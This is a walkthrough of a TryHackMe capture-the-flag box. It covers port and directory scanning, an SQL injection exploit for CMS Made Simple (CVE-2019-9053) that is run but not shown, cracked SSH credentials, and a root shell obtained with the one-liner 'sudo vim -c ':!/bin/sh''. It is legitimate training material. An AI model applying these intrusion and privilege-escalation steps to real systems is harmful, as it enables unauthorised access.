This was a easy challenge from TryHackMe.

Following were the nmap results
```diff
nmap -p- -A 10.10.232.159 -T4

Nmap scan report for 10.10.232.159
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.3.108
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 5.X|3.X (89%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 5.4 (89%), Linux 3.10 - 3.13 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   38.00 ms  10.17.0.1
2   ... 4
5   165.38 ms 10.10.232.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1022.65 seconds
```

At first glance port 80 and 21 look interesting.

The FTP port does not have anything interesting in it.

Port 80 leads to a basic apache web server default page.
![alt text](/assets/image8.png)

Let's try to dig in deeper. Running gobuster to find the directories that connected to this website.

```diff
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.232.159
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 315] [--> http://10.10.232.159/simple/]

[!] Keyboard interrupt detected, terminating.

===============================================================
Finished
===============================================================

```

Bingo we have found a directory named /simple

Exploring this page, we can see that it hosts a "CMS Made Simple v2.2.8". Looking for vulnerabilities on this service we can see that there is a CVE related to this service, CVE-2019-9053. This basically allowed an attacker to achieve unauthenticated blind time-based SQL injection, which in turn lead to credential leak

Running the exploit from exploitDB with the -u -w and --crack flags set we can find the username and password hash, after trying to find the hash of the password using crackstation I found that the username:password combo was mitch:secret. Now we can ssh into the machine using these credentials, but keep in mind ssh is not running on default port, its running on port 2222.
We can then cat out the user flag.

Now for privelege escalation I listed the allowed (and forbidden) commands for the invoking user usinf **sudo -l** command

```diff
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

From GTFObins I came across this one-liner **"sudo vim -c ':!/bin/sh'"** to escalate to root user

```diff
$ sudo vim -c ':!/bin/sh'

/# whoami 
root
/# cat /root/root.txt
W3ll d0n3. You made it!
/# 
```

Great! We have got both the user and root flags.